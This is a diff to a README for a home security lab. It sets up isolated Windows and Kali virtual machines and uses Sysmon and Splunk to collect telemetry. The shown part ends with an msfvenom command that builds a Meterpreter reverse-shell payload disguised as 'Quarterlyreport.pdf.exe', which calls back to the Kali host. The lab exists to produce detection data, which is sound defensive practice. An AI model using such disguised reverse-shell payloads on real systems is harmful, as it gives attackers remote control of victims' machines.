@@ -25,7 +25,7 @@ Example below.
 
 Spin up TWO VMs, One being Windows and the other being Kali Linux. On both VMs set the network adapter to the Internal Network setting while making both VM IPs static to the same network. This network scheme was selected for security reasons to keep the VMs from being accessible from the open web, while also being able to communicate with each other.
 The IP's in this lab are: Windows VM - 192.168.33.2, Kali VM - 192.168.33.3 
-For this lab, we will open up the RDP port(3389) and turn off the firewall on our Windows VM
+For this lab, we will open up the RDP port(3389) and turn off the firewall on our Windows VM.
 
 <img width="583" alt="image" src="https://github.com/user-attachments/assets/5b423ff8-596e-4f76-95a8-854c507c9b36" />
 
@@ -37,7 +37,7 @@ Installing Sysmon will enhance our ability to capture system events.(Since I don
 For Splunk configuration, I installed the Sysmon add-on and created the "endpoint" index. Our Sysmon config file will point to the index we created by its name, allowing Sysmon to send logs to our Splunk instance
 
 
-KALI SETUP
+###KALI SETUP###
 To create telemetry from our Kali VM to our Windows VM, we are going to use the well-known Metasploit pentesting tool.
 We will start by creating the Malware payload with this command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
 -p chooses the payload we want to use provided by the Metasploit tool. 
